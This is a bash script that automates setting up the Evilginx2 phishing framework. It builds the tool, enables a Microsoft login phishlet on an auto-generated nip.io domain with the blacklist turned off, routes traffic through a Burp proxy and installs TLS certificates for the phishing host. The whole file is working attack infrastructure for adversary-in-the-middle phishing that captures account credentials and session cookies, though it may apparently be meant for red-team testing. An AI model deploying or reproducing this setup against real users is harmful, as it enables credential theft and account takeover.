#!/bin/bash
# Push-button installer for Evilginx Setup
# Usage: ./evilginx_setup.sh <domain> <ip_addr> <burp_ip_addr>

# Arguments
DOMAIN=$1
IP_ADDR=$2
BURP_IP_ADDR=$3
FULL_DOMAIN="$DOMAIN.$(echo $IP_ADDR | tr '.' '-')".nip.io

# Install dependencies
sudo apt-get update && sudo apt-get install -y make certbot

# Install Go
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Install Evilginx
git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make
sudo cp build/evilginx /usr/local/bin/
mkdir -p /root/.evilginx/

# Configure Evilginx
cat > /root/.evilginx/config.json <<EOF
{
  "blacklist": {"mode": "off"},
  "general": {
    "autocert": false,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "$FULL_DOMAIN",
    "external_ipv4": "$IP_ADDR",
    "https_port": 443,
    "ipv4": "",
    "unauth_url": ""
  },
  "phishlets": {
    "microsoft": {
      "hostname": "$FULL_DOMAIN",
      "unauth_url": "",
      "enabled": true,
      "visible": true
    }
  },
  "proxy": {
    "address": "$BURP_IP_ADDR",
    "enabled": true,
    "password": "",
    "port": 8080,
    "type": "http",
    "username": ""
  }
}
EOF

# Obtain SSL Certificates
sudo certbot certonly --standalone --agree-tos --email admin@$FULL_DOMAIN \
    -d $FULL_DOMAIN --non-interactive

# Copy SSL certificates for Evilginx
for dir in /etc/letsencrypt/live/*/; do 
    domain=$(basename "$dir"); 
    [[ "$domain" == "README" ]] && continue; 
    mkdir -p ~/.evilginx/crt/sites/"$domain"; 
    cp "$dir/fullchain.pem" ~/.evilginx/crt/sites/"$domain"/cert.pem; 
    cp "$dir/privkey.pem" ~/.evilginx/crt/sites/"$domain"/priv.key; 
    done
